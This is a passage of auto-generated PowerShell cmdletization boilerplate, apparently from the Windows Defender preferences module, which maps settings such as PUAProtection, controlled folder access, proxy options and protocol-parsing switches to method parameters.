}\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableScanningNetworkFiles')) {\r\n          [object]$__cmdletization_value = ${DisableScanningNetworkFiles}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningNetworkFiles'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningNetworkFiles'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ApplyDisableNetworkScanningToIOAV')) {\r\n          [object]$__cmdletization_value = ${ApplyDisableNetworkScanningToIOAV}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ApplyDisableNetworkScanningToIOAV'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ApplyDisableNetworkScanningToIOAV'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('UILockdown')) {\r\n          [object]$__cmdletization_value = ${UILockdown}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UILockdown'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UILockdown'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Ids')) {\r\n          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Ids}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Actions')) {\r\n          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Actions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('UnknownThreatDefaultAction')) {\r\n          [object]$__cmdletization_value = ${UnknownThreatDefaultAc"
"tion}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UnknownThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UnknownThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('LowThreatDefaultAction')) {\r\n          [object]$__cmdletization_value = ${LowThreatDefaultAction}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LowThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LowThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ModerateThreatDefaultAction')) {\r\n          [object]$__cmdletization_value = ${ModerateThreatDefaultAction}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ModerateThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ModerateThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('HighThreatDefaultAction')) {\r\n          [object]$__cmdletization_value = ${HighThreatDefaultAction}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'HighThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'HighThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SevereThreatDefaultAction')) {\r\n          [object]$__cmdletization_value = ${SevereThreatDefaultAction}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SevereThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SevereThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableBlockAtFirstSeen')) {\r\n          [object]$__cmdletization_value = ${DisableBlockAtFirstSeen}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBlockAtFirstSeen'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBlockAtFirstSeen'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('PUAProtection')) {\r\n          [object]$__cmdletization_value = ${PUAProtection}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PUAProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PUAProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('CloudBlockLevel')) {\r\n          [object]$__cmdletization_value = ${CloudBlockLevel}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudBlockLevel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudBlockLevel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('CloudExtendedTimeout')) {\r\n          [object]$__cmdletization_value = ${CloudExtendedTimeout}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudExtendedTimeout'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudExtendedTimeout'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableNetworkProtection')) {\r\n          [object]$__cmdletization_value = ${EnableNetworkProtection}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableNetworkProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableNetworkProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableControlledFolderAccess')) {\r\n          [object]$__cmdletization_value = ${EnableControlledFolderAccess}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableControlledFolderAccess'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableControlledFolderAccess'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionOnlyExclusions')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionOnlyExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.Co"
"ntainsKey('ControlledFolderAccessAllowedApplications')) {\r\n          [object]$__cmdletization_value = ${ControlledFolderAccessAllowedApplications}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessProtectedFolders')) {\r\n          [object]$__cmdletization_value = ${ControlledFolderAccessProtectedFolders}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Ids')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Ids}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Actions')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Actions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableLowCpuPriority')) {\r\n          [object]$__cmdletization_value = ${EnableLowCpuPriority}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableLowCpuPriority'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableLowCpuPriority'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableFileHashComputation')) {\r\n          [object]$__cmdletization_value = ${EnableFileHashComputation}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFileHashComputation'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFileHashComputation'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableFullScanOnBatteryPower')) {\r\n          [object]$__cmdletization_value = ${EnableFullScanOnBatteryPower}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFullScanOnBatteryPower'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFullScanOnBatteryPower'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ProxyPacUrl')) {\r\n          [object]$__cmdletization_value = ${ProxyPacUrl}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyPacUrl'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyPacUrl'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ProxyServer')) {\r\n          [object]$__cmdletization_value = ${ProxyServer}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ProxyBypass')) {\r\n          [object]$__cmdletization_value = ${ProxyBypass}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyBypass'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyBypass'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ForceUseProxyOnly')) {\r\n          [object]$__cmdletization_value = ${ForceUseProxyOnly}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ForceUseProxyOnly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ForceUseProxyOnly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableTlsParsing')) {\r\n          [object]$__cmdletization_value = ${DisableTlsParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTlsParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTlsParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [ob"
"ject]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableFtpParsing')) {\r\n          [object]$__cmdletization_value = ${DisableFtpParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableFtpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableFtpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableHttpParsing')) {\r\n          [object]$__cmdletization_value = ${DisableHttpParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableHttpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableHttpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableDnsParsing')) {\r\n          [object]$__cmdletization_value = ${DisableDnsParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableDnsOverTcpParsing')) {\r\n          [object]$__cmdletization_value = ${DisableDnsOverTcpParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsOverTcpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsOverTcpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        